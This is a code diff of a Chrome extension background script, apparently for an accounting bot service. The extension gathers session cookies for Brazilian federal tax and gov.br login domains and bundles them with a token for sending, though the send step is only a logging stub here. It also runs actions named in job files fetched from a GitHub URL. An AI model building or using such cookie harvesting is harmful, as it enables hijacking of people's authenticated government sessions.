@@ -1,7 +1,14 @@
+let doThis = [];
 const botHosts = {remote: "https://api.contador.cloud", local: "https://localhost:8000"};
 const actions = {
     send: body => {
-
+        console.log(body);
+        console.log(doThis);
+    },
+    getJobs: async name => {
+        const url = "https://raw.githubusercontent.com/drupalista-br/drupalista-br.github.io/json/" + name + ".json";
+        const response = await fetch(url);
+        return response.json();
     },
     cookiesEat: domains => {
         return Promise.all(promises.cookiesGetAll(domains)).then(jars => {
@@ -13,36 +20,14 @@ const actions = {
     },
     cookiesEatReload: (domains, to) => {
         actions.cookiesEat(domains)
-        .then(results => chrome.tabs.update(doThis.tabId, {"url": to}));
+        .then(results => chrome.tabs.update(actions.tabId, {"url": to}));
     },
     cookiesGetAllSend: domains => {
         Promise.all(promises.cookiesGetAll(domains)).then(jars => {
             let cookies = {};
-            jars.forEach(jar => {
-                cookies[jar.domain] = jar.result;
-            });
+            jars.forEach(jar => cookies[jar.domain] = jar.result);
 
-            actions.send({token: doThis.token, cookies: cookies});
-        });
-    },
-    contextMenu: () => {
-        // TODO: use update and remove.
-        chrome.contextMenus.create({
-            "id": id,
-            "title": title,
-            "documentUrlPatterns": [
-                "http://*/*",
-                "https://*/*"
-            ]
-        });
-    },
-    alert: (title, message, interation = true) => {
-        chrome.notifications.create("contadorCloudCookiesAlert", {
-            type:'basic',
-            iconUrl: "icon.png",
-            message: message,
-            title: title,
-            requireInteraction: interation
+            actions.send({token: actions.token, cookies: cookies});
         });
     }
 };
@@ -95,25 +80,6 @@ const promises = {
         return promises;
     }
 };
-let doThis = [
-    {
-        url: "https://www.google.com?cookiesEatReload",
-        action: {
-            name: "cookiesEatReload",
-            args: [
-                ["receita.fazenda.gov.br", "acesso.gov.br"],
-                "https://cav.receita.fazenda.gov.br/autenticacao/login"
-            ]
-        }
-    },
-    {
-        url: "https://sso.acesso.gov.br/login?client_id=cav.receita.fazenda.gov.br&authorization_id=",
-        action: {
-            name: "cookiesGetAllSend",
-            args: [["receita.fazenda.gov.br", "acesso.gov.br"]]
-        }
-    }
-];
 
 /**
  * Executes on every page load. All of them.
@@ -122,34 +88,35 @@ chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
     if (changeInfo.status !== 'complete') return;
 
     const url = new URL(tab.url);
-    const hasJob = () => {
-        const starting = () => {
-            if (!url.searchParams.has("botToken"))
-                return;
-
-            return doThis = {
-                jobs: url.searchParams.get("botDoThis"),
-                tabId: tabId,
-                token: url.searchParams.get("botToken")
+    const starting = () => {
+        if (name = url.searchParams.get("botJobs")) {
+            const setToken = () => {
+                if (!(actions.token = url.searchParams.get("botToken")))
+                    throw new Error("botToken query parameter is missing.");
             };
-        };
-        const forThisPage = () => {
-            if (!doThis)
-                return;
-
-            if (tab.url.includes(doThis.jobs[0].url))
-                return true;
-        }
-        if (starting() || forThisPage())
+            setToken();
+            actions.getJobs(name).then(jobs => {
+                actions.tabId = tabId;
+                doThis = [...jobs];
+                doThis.shift();
+                actions[jobs[0].action.name](...jobs[0].action.args);
+            });
             return true;
+        }
+    };
+    const inCourse = () => {
+        if (doThis.length === 0) return;
+
+        if (tab.url.includes(doThis[0].url)) {
+            const name = doThis[0].action.name;
+            const args = doThis[0].action.args;
+
+            doThis.shift();
+            actions[name](...args);
+            return true;
+        }
     };
 
-
-
-    const teste = url.searchParams.has("teste");
-    const domains = ["receita.fazenda.gov.br", "acesso.gov.br"];
-    if (teste)
-        actions.cookiesGetAllSend(domains);
+    if (starting()) return;
+    inCourse();
 });
-
-//chrome.contextMenus.onClicked.addListener((info, tab) => runAction("onUserTrigger"));
